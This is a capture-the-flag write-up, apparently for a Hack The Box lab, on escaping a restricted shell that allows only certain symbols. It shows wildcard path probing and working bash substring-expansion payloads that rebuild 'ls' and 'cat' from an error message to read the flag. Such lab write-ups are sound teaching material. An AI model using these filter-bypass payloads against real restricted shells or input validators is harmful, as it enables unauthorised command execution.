# Broken Shell
### Challenge Description
We've built a secure sandbox environment that only allows specific symbols and numbers. It's designed to be inescapable—security at its best!


### Approach to solve the challenge
For interacting with this challenge we are given a restricted shell in which we are only allowed to enter few special characters and number. When we connect to the server using ncat we get the following response.

```bash
TERM environment variable not set.

ΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓóÇΓúÇΓúÇΓáÇΓáÇΓúÇΓúäΓúÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇ
SNIP
ΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓóÇΓúÇΓíçΓáÇΓáÇΓó╕ΓáÇΓíçΓáÇΓáÇΓáçΓáÇΓíçΓáÇΓáÇΓíçΓó╕ΓáÇΓáÇΓóáΓáïΓí¥ΓáëΓáôΓóªΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇΓáÇ


[*] Allowed characters: ^[0-9${}/?"[:space:]:&>_=()]+$
```
When we enter things which are not present in the given regex we get the following response.
```bash
Broken@Shell$ ls

[-] Error: Command contains disallowed characters.
```
From here we have to understand what can be done for running commands in this machine, we have to understand what is the working of the the special characters in linux.
```
*, ?, []: Used for wildcard matching in file name expansion. 
$: Used to reference variables or command output. 
|: Used to pipe the output of one command to another. 
>, <: Used for input/output redirection. 
&: Used to run a command in the background. 
#: Used to denote a comment. 
", ': Used for quoting to prevent special characters from being interpreted by the shell. 
`\`: Used to escape special characters
```

From the following list we can see that we can use the "?" as a wild card, so from here we tried to see what is the response we can get when we enter this wild card number of times.\
We are going to try "?" in conjunction with other characters "/", to see if we can traverse the directory and execute some binaries that exist.
Following images are the result of the random attempts in understanding the working.

```bash
Broken@Shell$ /???
/home/restricted_user/broken_shell.sh: line 41: /bin: Is a directory
Broken@Shell$ /????
/home/restricted_user/broken_shell.sh: line 41: /boot: Is a directory
Broken@Shell$ /?????
/home/restricted_user/broken_shell.sh: line 41: /lib32: Is a directory
Broken@Shell$ /???/??
/bin/cp: cannot create regular file '/sys/fs/dd': Read-only file system
SNIP
/bin/cp: -r not specified; omitting directory '/dev/fd'
Broken@Shell$ /???/???
E: Invalid operation /bin/awk
Broken@Shell$ /???/????
/bin/arch: extra operand '/bin/bash'
Try '/bin/arch --help' for more information.
Broken@Shell$ /???/????64
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAMC4AAAAAAABAAAAAAAAAANhiAAAAAAAAAAAAAEAAOAAN
SNIP
```

With this approach though I was stuck at this part only, as the wildcard what it's doing is executing the first binary whose words can be represented using that same number of wilcards, meaining if we use `/???/??` it will execute cp not ls.

This when I got some hint of **Bash Subtring Expansion** a really nice [read](https://jrb.nz/posts/bash-tricks/) for the same.\
**Definition**: Bash provides substring expansion as a powerful form of parameter expansion, allowing the extraction of a portion of a string variable's value.
**Syntax**: `${parameter:offset:length}`\
The whole idea is we will take the error from a command and store it as a variable, and then from that variable we are going to convert our commands.\

When we type `_1` it gives us the following error `/home/restricted_user/broken_shell.sh: line 41: _1: command not found`. From this we can see that we have the characters for making commands like ls and cat.\
Storing the result under a variable. `_1=$( _1 2>&1 )`.\
Constructing ls command from the same.
```bash
Broken@Shell$ _1=$( _1 2>&1 )
Broken@Shell$ ${_1:32:1}${_1:8:1}
broken_shell.sh  this_is_the_flag_gg
```
Constructing cat command to read the flag.
```bash
Broken@Shell$ _1=$( _1 2>&1 )
Broken@Shell$ _2=$( ${_1:32:1}${_1:8:1} 2>&1)
Broken@Shell$ ${_1:12:1}${_1:56:1}${_1:62:1} ${_2:16:19}
'This file contains the flag. The problem is that it is not on the first line so you have to read the whole file to get it :) '
'
HTB{flag}
```

Kudos to @Wathix for the tip.

### Completed
